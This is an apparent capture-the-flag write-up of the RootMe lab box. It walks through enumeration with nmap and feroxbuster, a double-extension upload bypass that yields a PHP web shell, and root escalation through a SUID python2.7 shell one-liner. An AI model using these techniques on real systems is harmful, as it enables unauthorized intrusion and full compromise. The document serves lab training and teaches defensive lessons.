# RootMe CTF Walkthrough

A concise walkthrough of the RootMe challenge, focusing on reconnaissance, file upload bypass, foothold acquisition, and privilege escalation to root.

> This write-up demonstrates a classic web exploitation flow: enumeration, upload validation bypass, command execution, and SUID-based privilege escalation.

## Challenge Overview

Target: `10.114.180.224`

The machine exposes an HTTP service and SSH service. The objective is to identify an upload vulnerability, obtain a web shell, read the `user.txt` flag, and then escalate privileges to root using a vulnerable SUID binary.

---

## 1. Reconnaissance

### Network Enumeration

We started with an Nmap scan to identify exposed services and versions.

```bash
nmap 10.114.180.224 -sV
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Web Enumeration

Next, we enumerated the web application and common directories.

```bash
feroxbuster -u http://10.114.180.224/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

```text
http://10.114.180.224/js/maquina_de_escrever.js
http://10.114.180.224/css/panel.css
http://10.114.180.224/css/home.css
http://10.114.180.224/js/
http://10.114.180.224/panel/
http://10.114.180.224/uploads/
```

### Key Finding

The directory `http://10.114.180.224/uploads/` appears to be a file upload endpoint.

![Web Enumeration](images/feroxbuster-enum.png)

---

## 2. Foothold

### File Upload Bypass

The upload functionality rejected `.php` files directly, but a double extension trick was successful.

The key observation was:

- Uploading `malware.php` was blocked
- Uploading `malware.php.jpg` succeeded

This indicates the application is checking only the last extension or the file type in a naive way.

```text
Uploaded file: shell.php.jpg
```

When accessed through the web server, the file was interpreted as PHP because the server used the extension logic incorrectly or ignored the middle extension.

![Upload Bypass](images/uploads-bypass.png)

### Web Shell Access

Once the malicious file was uploaded successfully, it executed as a PHP script, giving us an interactive shell on the server.

From the web shell, we were able to search for the user flag.

```bash
find / -name user.txt 2>/dev/null
```

```text
/var/www/user.txt
```

At this point, the initial foothold was established and the user flag was available.

---

## 3. Privilege Escalation

### Enumeration for Root Abuse

We enumerated the system for files with the SUID bit set, which is a common privilege escalation technique.

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

```text
/usr/bin/python2.7
```

This is the critical finding: `python2.7` has the SUID bit set, which can be abused to spawn a root shell.

> A SUID binary can run as the file owner (in this case, root) even when executed by an unprivileged user. This is a standard privilege escalation vector.

### Exploit Execution

We used Python to spawn a privileged shell:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Then we confirmed the effective privileges:

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

This confirms that we are now running as root.

![Privilege Escalation](images/priv-esc.png)

---

## 4. Final Flag Retrieval

Once root access was achieved, we navigated to the root directory and read the root flag.

```bash
cd /root
cat root.txt
```

```text
<root flag here>
```

The challenge was successfully completed.

---

## 5. Summary of the Exploit Chain

1. Enumerated open ports and web services with Nmap.
2. Discovered a file upload endpoint on the web server.
3. Bypassed upload validation using a `.php.jpg` file.
4. Triggered execution of the uploaded payload to obtain a web shell.
5. Located the `user.txt` file under `/var/www`.
6. Identified `python2.7` with SUID permissions.
7. Escalated privileges to root.
8. Read `/root/root.txt` and completed the challenge.

---

## Key Lessons

- Validate file extensions and MIME types properly.
- Never trust client-side validation alone.
- Always test upload restrictions for bypasses.
- Watch for SUID binaries during privilege escalation.
- Use minimal, targeted enumeration before exploitation.

> This challenge is an excellent example of how a weak upload validation mechanism can lead to full system compromise when paired with a vulnerable SUID binary.

---

## Useful References

- `nmap` for service discovery
- `feroxbuster` for directory brute forcing
- `find / -perm -4000 -type f` for SUID enumeration
- Linux privilege escalation via SUID binaries

---

## Screenshots Placeholder

![Nmap Scan Results](images/image-name.png)

![Web Enumeration Results](images/image-name.png)

![Upload Validation Bypass](images/image-name.png)

![Privileged Shell](images/image-name.png)

